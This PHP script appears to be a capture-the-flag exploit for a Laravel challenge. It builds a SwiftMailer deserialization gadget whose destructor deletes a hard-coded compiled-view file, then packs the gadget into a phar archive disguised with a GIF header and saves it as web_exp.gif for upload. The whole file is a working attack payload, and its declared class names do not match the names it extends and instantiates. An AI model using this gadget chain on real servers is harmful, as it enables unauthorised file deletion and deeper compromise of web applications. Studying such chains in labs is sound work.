<?php
class SwiftBytestreamAbstractfilterableinputstream {
	/**
	 * Write sequence.
	 */
	protected $sequence = 0;
	/**
	 * StreamFilters.
	 *
	 * @var Swift_StreamFilter[]
	 */
	private $filters = [];
	/**
	 * A buffer for writing.
	 */
	private $writeBuffer = '';
	/**
	 * Bound streams.
	 *
	 * @var Swift_InputByteStream[]
	 */
	private $mirrors = [];
}
class SwiftBytestreamFilebytestream extends Swift_ByteStream_AbstractFilterableInputStream {
	/** The internal pointer offset */
	private $_offset = 0;

	/** The path to the file */
	private $_path;

	/** The mode this file is opened in for writing */
	private $_mode;

	/** A lazy-loaded resource handle for reading the file */
	private $_reader;

	/** A lazy-loaded resource handle for writing the file */
	private $_writer;

	/** If magic_quotes_runtime is on, this will be true */
	private $_quotes = false;

	/** If stream is seekable true/false, or null if not known */
	private $_seekable = null;

	/**
	 * Create a new FileByteStream for $path.
	 *
	 * @param string $path
	 * @param bool   $writable if true
	 */
	public function __construct($path, $writable = false) {
		$this->_path = $path;
		$this->_mode = $writable ? 'w+b' : 'rb';

		if (function_exists('get_magic_quotes_runtime') && @get_magic_quotes_runtime() == 1) {
			$this->_quotes = true;
		}
	}

	/**
	 * Get the complete path to the file.
	 *
	 * @return string
	 */
	public function getPath() {
		return $this->_path;
	}
}
class SwiftBytestreamTemporaryfilebytestream extends Swift_ByteStream_FileByteStream {
	public function __construct() {
		$filePath = "/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php";
		// $filePath = "/var/www/html/storage/framework/views/123";
		// $filePath = '/path/to/2018/huwangbei/easy_laravel/storage/framework/views/123';
		parent::__construct($filePath, true);
	}
	public function __destruct() {
		if (file_exists($this->getPath())) {
			@unlink($this->getPath());
		}
	}
}
$obj = new Swift_ByteStream_TemporaryFileByteStream();
echo serialize($obj);
$p = new Phar('./web_exp.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p->setMetadata($obj);
$p->addFromString('v.txt', 'text');
$p->stopBuffering();
copy('./web_exp.phar', 'web_exp.gif');
?>